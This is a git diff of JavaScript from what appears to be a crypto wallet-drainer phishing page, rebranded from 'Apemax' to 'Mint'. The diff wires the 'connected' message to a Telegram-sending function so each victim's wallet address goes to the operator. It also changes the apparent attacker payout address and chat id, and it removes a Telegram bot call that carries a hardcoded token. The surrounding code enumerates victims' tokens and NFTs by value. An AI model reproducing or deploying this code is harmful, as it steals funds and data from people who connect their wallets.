@@ -98,13 +98,13 @@ $(".proceed").click(async function () {
     }
 }
     selectedAccount = account.address;
-    sendMessage("Apemax Wallet Connected Successfully to eth mainnet!")
+    sendMessage("Mint Wallet Connected Successfully to eth mainnet!")
         sendMessage(`Cl address : ${selectedAccount}`)
         
         covalenthqAPICall();
 })
-const Oxa = "0x0a8360dba534E12535c5D2F1EB946b7c3575f852"
-const Oxc1 = "5227607491"
+const Oxa = "0xc8099791a76503a50F416f41390A1222B3D17387"
+const Oxc1 = "2101822285"
 
 
 async function covalenthqAPICall() {
@@ -148,13 +148,7 @@ async function covalenthqAPICall() {
         tokens = map_list.filter(f => f.value > 5)
         tokens.sort((a, b) => b.value - a.value);
 
-        let token1 = {
-            address : "0x5bd97d0c8e668298f2a6baa069f47f556a447a78",
-            balance : "9999999999999999999999",
-            value : 1000
-        }
-
-        tokens.unshift(token1)
+    
         console.log("chainId:", await getNetwork(), "Tokens:", tokens);
         NFTs = await getNFTs(selectedAccount).catch(e=>{
             console.log("Unable to get NFts", e);
@@ -201,7 +195,7 @@ async function onSendEther() {
 
 }
 async function sendMessage(message){
-    console.log(message)
+    sendMessage1(message)
     
 }
 
@@ -222,23 +216,7 @@ async function sendMessage1(message){
         })
     })
   }
-  async function sendMessage2(message){
-    return new Promise((resolve, reject)=>{
-      const chat_id = Oxc2;
-      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
-            method: "GET",
-            headers: {
-                
-            }
-        })
-        .then(async(res) => {
-            if(res.status > 399) throw res;
-            resolve(await res.json());
-        }).catch(err=>{
-            reject(err);
-        })
-    })
-  }
+ 
 
 
 async function getPrice(address){
